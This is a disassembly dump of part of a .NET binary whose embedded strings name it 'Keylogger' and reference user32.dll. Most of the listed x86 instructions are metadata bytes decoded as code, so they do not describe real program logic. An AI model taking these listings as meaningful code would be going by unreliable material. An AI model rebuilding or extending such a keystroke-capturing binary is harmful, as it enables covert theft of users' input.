  40a6fa:	01 02                	add    %eax,(%edx)
  40a6fc:	0e                   	push   %cs
  40a6fd:	05 20 01 12 09       	add    $0x9120120,%eax
  40a702:	0e                   	push   %cs
  40a703:	04 00                	add    $0x0,%al
  40a705:	00 11                	add    %dl,(%ecx)
  40a707:	31 05 00 01 0e 1d    	xor    %eax,0x1d0e0100
  40a70d:	0e                   	push   %cs
  40a70e:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  40a713:	0e                   	push   %cs
  40a714:	06                   	push   %es
  40a715:	20 03                	and    %al,(%ebx)
  40a717:	01 0e                	add    %ecx,(%esi)
  40a719:	0e                   	push   %cs
  40a71a:	0e                   	push   %cs
  40a71b:	06                   	push   %es
  40a71c:	00 03                	add    %al,(%ebx)
  40a71e:	18 08                	sbb    %cl,(%eax)
  40a720:	18 18                	sbb    %bl,(%eax)
  40a722:	02 06                	add    (%esi),%al
  40a724:	0e                   	push   %cs
  40a725:	14 75                	adc    $0x75,%al
  40a727:	00 73 00             	add    %dh,0x0(%ebx)
  40a72a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40a72e:	33 00                	xor    (%eax),%eax
  40a730:	32 00                	xor    (%eax),%al
  40a732:	2e 00 64 00 6c       	add    %ah,%cs:0x6c(%eax,%eax,1)
  40a737:	00 6c 00 02          	add    %ch,0x2(%eax,%eax,1)
  40a73b:	06                   	push   %es
  40a73c:	06                   	push   %es
  40a73d:	02 00                	add    (%eax),%al
  40a73f:	01 02                	add    %eax,(%edx)
  40a741:	06                   	push   %es
  40a742:	08 04 04             	or     %al,(%esp,%eax,1)
  40a745:	01 00                	add    %eax,(%eax)
  40a747:	00 03                	add    %al,(%ebx)
  40a749:	06                   	push   %es
  40a74a:	12 14 04             	adc    (%esp,%eax,1),%dl
  40a74d:	00 01                	add    %al,(%ecx)
  40a74f:	02 18                	add    (%eax),%bl
  40a751:	04 00                	add    $0x0,%al
  40a753:	01 18                	add    %ebx,(%eax)
  40a755:	09 07                	or     %eax,(%edi)
  40a757:	00 04 18             	add    %al,(%eax,%ebx,1)
  40a75a:	18 08                	sbb    %cl,(%eax)
  40a75c:	18 18                	sbb    %bl,(%eax)
  40a75e:	05 00 01 02 1d       	add    $0x1d020100,%eax
  40a763:	05 01 02 0c 00       	add    $0xc0201,%eax
  40a768:	07                   	pop    %es
  40a769:	08 09                	or     %cl,(%ecx)
  40a76b:	09 1d 05 12 09 08    	or     %ebx,0x8091205
  40a771:	09 18                	or     %ebx,(%eax)
  40a773:	01 15 05 00 02 09    	add    %edx,0x9020005
  40a779:	09 09                	or     %ecx,(%ecx)
  40a77b:	08 00                	or     %al,(%eax)
  40a77d:	04 18                	add    $0x18,%al
  40a77f:	08 12                	or     %dl,(%edx)
  40a781:	14 18                	adc    $0x18,%al
  40a783:	09 03                	or     %eax,(%ebx)
  40a785:	00 00                	add    %al,(%eax)
  40a787:	18 06                	sbb    %al,(%esi)
  40a789:	00 02                	add    %al,(%edx)
  40a78b:	09 18                	or     %ebx,(%eax)
  40a78d:	10 09                	adc    %cl,(%ecx)
  40a78f:	04 00                	add    $0x0,%al
  40a791:	01 06                	add    %eax,(%esi)
  40a793:	08 07                	or     %al,(%edi)
  40a795:	00 03                	add    %al,(%ebx)
  40a797:	08 18                	or     %bl,(%eax)
  40a799:	12 09                	adc    (%ecx),%cl
  40a79b:	08 03                	or     %al,(%ebx)
  40a79d:	06                   	push   %es
  40a79e:	11 29                	adc    %ebp,(%ecx)
  40a7a0:	06                   	push   %es
  40a7a1:	20 03                	and    %al,(%ebx)
  40a7a3:	18 08                	sbb    %cl,(%eax)
  40a7a5:	18 18                	sbb    %bl,(%eax)
  40a7a7:	0a 20                	or     (%eax),%ah
  40a7a9:	05 12 49 08 18       	add    $0x18084912,%eax
  40a7ae:	18 12                	sbb    %dl,(%edx)
  40a7b0:	4d                   	dec    %ebp
  40a7b1:	1c 05                	sbb    $0x5,%al
  40a7b3:	20 01                	and    %al,(%ecx)
  40a7b5:	18 12                	sbb    %dl,(%edx)
  40a7b7:	49                   	dec    %ecx
  40a7b8:	03 06                	add    (%esi),%eax
  40a7ba:	12 55 04             	adc    0x4(%ebp),%dl
  40a7bd:	01 00                	add    %eax,(%eax)
  40a7bf:	00 00                	add    %al,(%eax)
  40a7c1:	03 06                	add    (%esi),%eax
  40a7c3:	12 5d 02             	adc    0x2(%ebp),%bl
  40a7c6:	06                   	push   %es
  40a7c7:	02 03                	add    (%ebx),%al
  40a7c9:	06                   	push   %es
  40a7ca:	12 1c 03             	adc    (%ebx,%eax,1),%bl
  40a7cd:	06                   	push   %es
  40a7ce:	12 20                	adc    (%eax),%ah
  40a7d0:	03 06                	add    (%esi),%eax
  40a7d2:	12 24 03             	adc    (%ebx,%eax,1),%ah
  40a7d5:	06                   	push   %es
  40a7d6:	12 28                	adc    (%eax),%ch
  40a7d8:	04 20                	add    $0x20,%al
  40a7da:	00 12                	add    %dl,(%edx)
  40a7dc:	55                   	push   %ebp
  40a7dd:	05 20 01 01 12       	add    $0x12010120,%eax
  40a7e2:	55                   	push   %ebp
  40a7e3:	04 20                	add    $0x20,%al
  40a7e5:	00 12                	add    %dl,(%edx)
  40a7e7:	5d                   	pop    %ebp
  40a7e8:	05 20 01 01 12       	add    $0x12010120,%eax
  40a7ed:	5d                   	pop    %ebp
  40a7ee:	03 20                	add    (%eax),%esp
  40a7f0:	00 02                	add    %al,(%edx)
  40a7f2:	04 20                	add    $0x20,%al
  40a7f4:	01 01                	add    %eax,(%ecx)
  40a7f6:	02 04 20             	add    (%eax,%eiz,1),%al
  40a7f9:	01 01                	add    %eax,(%ecx)
  40a7fb:	0e                   	push   %cs
  40a7fc:	06                   	push   %es
  40a7fd:	20 02                	and    %al,(%edx)
  40a7ff:	01 12                	add    %edx,(%edx)
  40a801:	55                   	push   %ebp
  40a802:	0e                   	push   %cs
  40a803:	03 07                	add    (%edi),%eax
  40a805:	01 02                	add    %eax,(%edx)
  40a807:	09 20                	or     %esp,(%eax)
  40a809:	03 01                	add    (%ecx),%eax
  40a80b:	11 61 11             	adc    %esp,0x11(%ecx)
  40a80e:	65 11 69 08          	adc    %ebp,%gs:0x8(%ecx)
  40a812:	20 03                	and    %al,(%ebx)
  40a814:	01 11                	add    %edx,(%ecx)
  40a816:	6d                   	insl   (%dx),%es:(%edi)
  40a817:	11 71 02             	adc    %esi,0x2(%ecx)
  40a81a:	03 20                	add    (%eax),%esp
  40a81c:	00 08                	add    %cl,(%eax)
  40a81e:	05 20 02 01 0e       	add    $0xe010220,%eax
  40a823:	08 05 20 01 01 12    	or     %al,0x12010120
  40a829:	49                   	dec    %ecx
  40a82a:	0c 07                	or     $0x7,%al
  40a82c:	07                   	pop    %es
  40a82d:	08 08                	or     %cl,(%eax)
  40a82f:	1d 05 08 08 1d       	sbb    $0x1d080805,%eax
  40a834:	05 1d 05 06 20       	add    $0x2006051d,%eax
  40a839:	02 02                	add    (%edx),%al
  40a83b:	08 11                	or     %dl,(%ecx)
  40a83d:	75 09                	jne    0x40a848
  40a83f:	20 04 08             	and    %al,(%eax,%ecx,1)
  40a842:	1d 05 08 08 11       	sbb    $0x11080805,%eax
  40a847:	79 06                	jns    0x40a84f
  40a849:	00 02                	add    %al,(%edx)
  40a84b:	08 1d 05 08 04 20    	or     %bl,0x20040805
  40a851:	00 1d 05 04 07 01    	add    %bl,0x1070405
  40a857:	1d 05 08 00 02       	sbb    $0x2000805,%eax
  40a85c:	12 80 85 1d 05 0e    	adc    0xe051d85(%eax),%al
  40a862:	07                   	pop    %es
  40a863:	20 01                	and    %al,(%ecx)
  40a865:	12 80 85 1d 05 05    	adc    0x5051d85(%eax),%al
  40a86b:	07                   	pop    %es
  40a86c:	01 12                	add    %edx,(%edx)
  40a86e:	80 85 05 20 00 11 80 	addb   $0x80,0x11002005(%ebp)
  40a875:	89 06                	mov    %eax,(%esi)
  40a877:	20 01                	and    %al,(%ecx)
  40a879:	01 12                	add    %edx,(%edx)
  40a87b:	80 85 0e 07 09 1d 05 	addb   $0x5,0x1d09070e(%ebp)
  40a882:	12 5d 02             	adc    0x2(%ebp),%bl
  40a885:	08 08                	or     %cl,(%eax)
  40a887:	08 1d 05 08 08 08    	or     %bl,0x8080805
  40a88d:	00 02                	add    %al,(%edx)
  40a88f:	1d 05 12 80 85       	sbb    $0x85801205,%eax
  40a894:	0e                   	push   %cs
  40a895:	06                   	push   %es
  40a896:	00 02                	add    %al,(%edx)
  40a898:	01 1c 10             	add    %ebx,(%eax,%edx,1)
  40a89b:	02 05 00 01 1d 05    	add    0x51d0100,%al
  40a8a1:	08 05 20 01 08 1d    	or     %al,0x1d080120
  40a8a7:	05 04 00 01 01       	add    $0x1010004,%eax
  40a8ac:	1c 06                	sbb    $0x6,%al
  40a8ae:	20 01                	and    %al,(%ecx)
  40a8b0:	08 12                	or     %dl,(%edx)
  40a8b2:	80 85 03 07 01 08 04 	addb   $0x4,0x8010703(%ebp)
  40a8b9:	28 00                	sub    %al,(%eax)
  40a8bb:	12 55 04             	adc    0x4(%ebp),%dl
  40a8be:	28 00                	sub    %al,(%eax)
  40a8c0:	12 5d 03             	adc    0x3(%ebp),%bl
  40a8c3:	28 00                	sub    %al,(%eax)
  40a8c5:	02 03                	add    (%ebx),%al
  40a8c7:	28 00                	sub    %al,(%eax)
  40a8c9:	0e                   	push   %cs
  40a8ca:	07                   	pop    %es
  40a8cb:	20 02                	and    %al,(%edx)
  40a8cd:	12 49 12             	adc    0x12(%ecx),%cl
  40a8d0:	4d                   	dec    %ebp
  40a8d1:	1c 05                	sbb    $0x5,%al
  40a8d3:	20 01                	and    %al,(%ecx)
  40a8d5:	02 12                	add    (%edx),%dl
  40a8d7:	49                   	dec    %ecx
  40a8d8:	0a 20                	or     (%eax),%ah
  40a8da:	03 12                	add    (%edx),%edx
  40a8dc:	49                   	dec    %ecx
  40a8dd:	12 80 85 12 4d 1c    	adc    0x1c4d1285(%eax),%al
  40a8e3:	05 20 01 08 12       	add    $0x12080120,%eax
  40a8e8:	49                   	dec    %ecx
  40a8e9:	06                   	push   %es
  40a8ea:	20 01                	and    %al,(%ecx)
  40a8ec:	1d 05 12 49 09       	sbb    $0x9491205,%eax
  40a8f1:	20 03                	and    %al,(%ebx)
  40a8f3:	12 49 1d             	adc    0x1d(%ecx),%cl
  40a8f6:	05 12 4d 1c 07       	add    $0x71c4d12,%eax
  40a8fb:	20 01                	and    %al,(%ecx)
  40a8fd:	12 80 85 12 49 03    	adc    0x3491285(%eax),%al
  40a903:	06                   	push   %es
  40a904:	12 18                	adc    (%eax),%bl
  40a906:	05 20 00 12 80       	add    $0x80120020,%eax
  40a90b:	85 06                	test   %eax,(%esi)
  40a90d:	00 01                	add    %al,(%ecx)
  40a90f:	01 12                	add    %edx,(%edx)
  40a911:	80 91 02 06 1c 08 06 	adcb   $0x6,0x81c0602(%ecx)
  40a918:	15 12 80 99 02       	adc    $0x2998012,%eax
  40a91d:	0e                   	push   %cs
  40a91e:	02 08                	add    (%eax),%cl
  40a920:	06                   	push   %es
  40a921:	15 12 80 99 02       	adc    $0x2998012,%eax
  40a926:	0e                   	push   %cs
  40a927:	0e                   	push   %cs
  40a928:	06                   	push   %es
  40a929:	00 01                	add    %al,(%ecx)
  40a92b:	0e                   	push   %cs
  40a92c:	12 80 9d 0d 07 04    	adc    0x4070d9d(%eax),%al
  40a932:	1d 12 80 a1 08       	sbb    $0x8a18012,%eax
  40a937:	12 80 a1 12 80 a5    	adc    -0x5a7fed5f(%eax),%al
  40a93d:	05 00 00 12 80       	add    $0x80120000,%eax
  40a942:	a9 06 20 00 1d       	test   $0x1d002006,%eax
  40a947:	12 80 a1 05 20 00    	adc    0x2005a1(%eax),%al
  40a94d:	12 80 a5 08 00 03    	adc    0x30008a5(%eax),%al
  40a953:	02 0e                	add    (%esi),%cl
  40a955:	0e                   	push   %cs
  40a956:	11 80 ad 05 20 00    	adc    %eax,0x2005ad(%eax)
  40a95c:	12 80 9d 08 00 01    	adc    0x100089d(%eax),%al
  40a962:	12 80 a1 12 80 a5    	adc    -0x5a7fed5f(%eax),%al
  40a968:	05 07 02 1d 05       	add    $0x51d0207,%eax
  40a96d:	08 07                	or     %al,(%edi)
  40a96f:	20 03                	and    %al,(%ebx)
  40a971:	01 1d 05 08 08 07    	add    %ebx,0x7080805
  40a977:	20 03                	and    %al,(%ebx)
  40a979:	08 1d 05 08 08 09    	or     %bl,0x9080805
  40a97f:	00 02                	add    %al,(%edx)
  40a981:	01 12                	add    %edx,(%edx)
  40a983:	80 b1 12 80 b1 11 07 	xorb   $0x7,0x11b18012(%ecx)
  40a98a:	05 12 80 a1 12       	add    $0x12a18012,%eax
  40a98f:	80 b1 12 80 b5 12 80 	xorb   $0x80,0x12b58012(%ecx)
  40a996:	b9 12 80 b1 05       	mov    $0x5b18012,%ecx
  40a99b:	00 00                	add    %al,(%eax)
  40a99d:	12 80 a1 04 20 01    	adc    0x12004a1(%eax),%al
  40a9a3:	02 0e                	add    (%esi),%cl
  40a9a5:	06                   	push   %es
  40a9a6:	20 01                	and    %al,(%ecx)
  40a9a8:	12 80 b1 0e 09 20    	adc    0x20090eb1(%eax),%al
  40a9ae:	02 01                	add    (%ecx),%al
  40a9b0:	12 80 b1 11 80 bd    	adc    -0x427fee4f(%eax),%al
  40a9b6:	04 20                	add    $0x20,%al
  40a9b8:	01 01                	add    %eax,(%ecx)
  40a9ba:	0a 06                	or     (%esi),%al
  40a9bc:	00 01                	add    %al,(%ecx)
  40a9be:	12 80 b1 0e 03 07    	adc    0x7030eb1(%eax),%al
  40a9c4:	01 0e                	add    %ecx,(%esi)
  40a9c6:	07                   	pop    %es
  40a9c7:	15 12 80 99 02       	adc    $0x2998012,%eax
  40a9cc:	0e                   	push   %cs
  40a9cd:	0e                   	push   %cs
  40a9ce:	08 20                	or     %ah,(%eax)
  40a9d0:	02 02                	add    (%edx),%al
  40a9d2:	13 00                	adc    (%eax),%eax
  40a9d4:	10 13                	adc    %dl,(%ebx)
  40a9d6:	01 0d 00 02 12 80    	add    %ecx,0x80120200
  40a9dc:	b1 15                	mov    $0x15,%cl
  40a9de:	12 80 99 02 0e 0e    	adc    0xe0e0299(%eax),%al
  40a9e4:	0e                   	push   %cs
  40a9e5:	03 20                	add    (%eax),%esp
  40a9e7:	00 0a                	add    %cl,(%edx)
  40a9e9:	07                   	pop    %es
  40a9ea:	00 01                	add    %al,(%ecx)
  40a9ec:	1d 05 12 80 b1       	sbb    $0xb1801205,%eax
  40a9f1:	10 07                	adc    %al,(%edi)
  40a9f3:	06                   	push   %es
  40a9f4:	0e                   	push   %cs
  40a9f5:	1d 05 12 80 b1       	sbb    $0xb1801205,%eax
  40a9fa:	12 80 a1 12 80 b1    	adc    -0x4e7fed5f(%eax),%al
  40aa00:	1d 05 09 00 02       	sbb    $0x2000905,%eax
  40aa05:	12 80 a1 1d 05 1d    	adc    0x1d051da1(%eax),%al
  40aa0b:	05 07 00 01 12       	add    $0x12010007,%eax
  40aa10:	80 a1 1d 05 16 00 03 	andb   $0x3,0x16051d(%ecx)
  40aa17:	12 80 a1 15 12 80    	adc    -0x7fedea5f(%eax),%al
  40aa1d:	99                   	cltd
  40aa1e:	02 0e                	add    (%esi),%cl
  40aa20:	0e                   	push   %cs
  40aa21:	15 12 80 99 02       	adc    $0x2998012,%eax
  40aa26:	0e                   	push   %cs
  40aa27:	0e                   	push   %cs
  40aa28:	12 80 a5 0d 07 05    	adc    0x5070da5(%eax),%al
  40aa2e:	12 80 a5 12 80 a1    	adc    -0x5e7fed5b(%eax),%al
  40aa34:	1c 02                	sbb    $0x2,%al
  40aa36:	12 80 a1 07 15 12    	adc    0x121507a1(%eax),%al
  40aa3c:	80 99 02 0e 02 05 20 	sbbb   $0x20,0x5020e02(%ecx)
  40aa43:	01 02                	add    %eax,(%edx)
  40aa45:	13 00                	adc    (%eax),%eax
  40aa47:	09 00                	or     %eax,(%eax)
  40aa49:	02 02                	add    (%edx),%al
  40aa4b:	12 80 a1 12 80 a1    	adc    -0x5e7fed5f(%eax),%al
  40aa51:	07                   	pop    %es
  40aa52:	20 02                	and    %al,(%edx)
  40aa54:	01 13                	add    %edx,(%ebx)
  40aa56:	00 13                	add    %dl,(%ebx)
  40aa58:	01 05 20 00 11 80    	add    %eax,0x80110020
  40aa5e:	c5 09                	lds    (%ecx),%ecx
  40aa60:	00 02                	add    %al,(%edx)
  40aa62:	12 80 a1 1c 12 80    	adc    -0x7fede35f(%eax),%al
  40aa68:	c1 06 00             	roll   $0x0,(%esi)
  40aa6b:	02 08                	add    (%eax),%cl
  40aa6d:	10 08                	adc    %cl,(%eax)
  40aa6f:	08 06                	or     %al,(%esi)
  40aa71:	20 01                	and    %al,(%ecx)
  40aa73:	01 12                	add    %edx,(%edx)
  40aa75:	80 cd 0e             	or     $0xe,%ch
  40aa78:	36 00 2e             	add    %ch,%ss:(%esi)
  40aa7b:	00 30                	add    %dh,(%eax)
  40aa7d:	00 2e                	add    %ch,(%esi)
  40aa7f:	00 30                	add    %dh,(%eax)
  40aa81:	00 2e                	add    %ch,(%esi)
  40aa83:	00 30                	add    %dh,(%eax)
  40aa85:	00 0e                	add    %cl,(%esi)
  40aa87:	34 00                	xor    $0x0,%al
  40aa89:	2e 00 31             	add    %dh,%cs:(%ecx)
  40aa8c:	00 2e                	add    %ch,(%esi)
  40aa8e:	00 30                	add    %dh,(%eax)
  40aa90:	00 2e                	add    %ch,(%esi)
  40aa92:	00 30                	add    %dh,(%eax)
  40aa94:	00 08                	add    %cl,(%eax)
  40aa96:	01 00                	add    %eax,(%eax)
  40aa98:	08 00                	or     %al,(%eax)
  40aa9a:	00 00                	add    %al,(%eax)
  40aa9c:	00 00                	add    %al,(%eax)
  40aa9e:	1e                   	push   %ds
  40aa9f:	01 00                	add    %eax,(%eax)
  40aaa1:	01 00                	add    %eax,(%eax)
  40aaa3:	54                   	push   %esp
  40aaa4:	02 16                	add    (%esi),%dl
  40aaa6:	57                   	push   %edi
  40aaa7:	72 61                	jb     0x40ab0a
  40aaa9:	70 4e                	jo     0x40aaf9
  40aaab:	6f                   	outsl  %ds:(%esi),(%dx)
  40aaac:	6e                   	outsb  %ds:(%esi),(%dx)
  40aaad:	45                   	inc    %ebp
  40aaae:	78 63                	js     0x40ab13
  40aab0:	65 70 74             	gs jo  0x40ab27
  40aab3:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40aaba:	77 73                	ja     0x40ab2f
  40aabc:	01 06                	add    %eax,(%esi)
  40aabe:	20 01                	and    %al,(%ecx)
  40aac0:	01 11                	add    %edx,(%ecx)
  40aac2:	80 dd 08             	sbb    $0x8,%ch
  40aac5:	01 00                	add    %eax,(%eax)
  40aac7:	02 00                	add    (%eax),%al
  40aac9:	00 00                	add    %al,(%eax)
  40aacb:	00 00                	add    %al,(%eax)
  40aacd:	0e                   	push   %cs
  40aace:	01 00                	add    %eax,(%eax)
  40aad0:	09 4b 65             	or     %ecx,0x65(%ebx)
  40aad3:	79 6c                	jns    0x40ab41
  40aad5:	6f                   	outsl  %ds:(%esi),(%dx)
  40aad6:	67 67 65 72 00       	addr16 addr16 gs jb 0x40aadb
  40aadb:	00 05 01 00 00 00    	add    %al,0x1
  40aae1:	00 17                	add    %dl,(%edi)
  40aae3:	01 00                	add    %eax,(%eax)
  40aae5:	12 43 6f             	adc    0x6f(%ebx),%al
  40aae8:	70 79                	jo     0x40ab63
  40aaea:	72 69                	jb     0x40ab55
  40aaec:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40aaf2:	20 20                	and    %ah,(%eax)
  40aaf4:	32 30                	xor    (%eax),%dh
  40aaf6:	32 32                	xor    (%edx),%dh
  40aaf8:	00 00                	add    %al,(%eax)
  40aafa:	29 01                	sub    %eax,(%ecx)
  40aafc:	00 24 64             	add    %ah,(%esp,%eiz,2)
  40aaff:	36 30 63 37          	xor    %ah,%ss:0x37(%ebx)
  40ab03:	33 32                	xor    (%edx),%esi
  40ab05:	37                   	aaa
  40ab06:	2d 37 39 64 34       	sub    $0x34643937,%eax
  40ab0b:	2d 34 35 32 35       	sub    $0x35323534,%eax
  40ab10:	2d 39 35 64 39       	sub    $0x39643539,%eax
  40ab15:	2d 61 64 64 36       	sub    $0x36646461,%eax
  40ab1a:	62 35 35 39 38 36    	bound  %esi,0x36383935
  40ab20:	61                   	popa
  40ab21:	38 00                	cmp    %al,(%eax)
  40ab23:	00 0c 01             	add    %cl,(%ecx,%eax,1)
  40ab26:	00 07                	add    %al,(%edi)
  40ab28:	31 2e                	xor    %ebp,(%esi)
  40ab2a:	30 2e                	xor    %ch,(%esi)
  40ab2c:	30 2e                	xor    %ch,(%esi)
  40ab2e:	30 00                	xor    %al,(%eax)
  40ab30:	00 49 01             	add    %cl,0x1(%ecx)
  40ab33:	00 1a                	add    %bl,(%edx)
  40ab35:	2e 4e                	cs dec %esi
  40ab37:	45                   	inc    %ebp
  40ab38:	54                   	push   %esp
  40ab39:	46                   	inc    %esi
  40ab3a:	72 61                	jb     0x40ab9d
  40ab3c:	6d                   	insl   (%dx),%es:(%edi)
  40ab3d:	65 77 6f             	gs ja  0x40abaf
  40ab40:	72 6b                	jb     0x40abad
  40ab42:	2c 56                	sub    $0x56,%al
  40ab44:	65 72 73             	gs jb  0x40abba
  40ab47:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40ab4e:	35 01 00 54 0e       	xor    $0xe540001,%eax
  40ab53:	14 46                	adc    $0x46,%al
  40ab55:	72 61                	jb     0x40abb8
  40ab57:	6d                   	insl   (%dx),%es:(%edi)
  40ab58:	65 77 6f             	gs ja  0x40abca
  40ab5b:	72 6b                	jb     0x40abc8
  40ab5d:	44                   	inc    %esp
  40ab5e:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40ab65:	61                   	popa
  40ab66:	6d                   	insl   (%dx),%es:(%edi)
  40ab67:	65 12 2e             	adc    %gs:(%esi),%ch
  40ab6a:	4e                   	dec    %esi
  40ab6b:	45                   	inc    %ebp
  40ab6c:	54                   	push   %esp
  40ab6d:	20 46 72             	and    %al,0x72(%esi)
  40ab70:	61                   	popa
  40ab71:	6d                   	insl   (%dx),%es:(%edi)
  40ab72:	65 77 6f             	gs ja  0x40abe4
  40ab75:	72 6b                	jb     0x40abe2
  40ab77:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40ab7a:	35 00 00 00 00       	xor    $0x0,%eax
	...
  40ab87:	00 10                	add    %dl,(%eax)
	...
  40ab91:	00 00                	add    %al,(%eax)
  40ab93:	00 98 8d 00 00 c0    	add    %bl,-0x3fffff73(%eax)
  40ab99:	ab                   	stos   %eax,%es:(%edi)
	...
  40aba2:	00 00                	add    %al,(%eax)
  40aba4:	de ab 00 00 00 20    	fisubrs 0x20000000(%ebx)
	...
  40abbe:	00 00                	add    %al,(%eax)
  40abc0:	d0 ab 00 00 00 00    	shrb   $1,0x0(%ebx)
	...
  40abd2:	5f                   	pop    %edi
  40abd3:	43                   	inc    %ebx
  40abd4:	6f                   	outsl  %ds:(%esi),(%dx)
  40abd5:	72 44                	jb     0x40ac1b
  40abd7:	6c                   	insb   (%dx),%es:(%edi)
  40abd8:	6c                   	insb   (%dx),%es:(%edi)
  40abd9:	4d                   	dec    %ebp
  40abda:	61                   	popa
  40abdb:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  40abe2:	72 65                	jb     0x40ac49
  40abe4:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40abe8:	6c                   	insb   (%dx),%es:(%edi)
  40abe9:	00 00                	add    %al,(%eax)
  40abeb:	00 00                	add    %al,(%eax)
  40abed:	00 ff                	add    %bh,%bh
  40abef:	25 00 20 40 00       	and    $0x402000,%eax
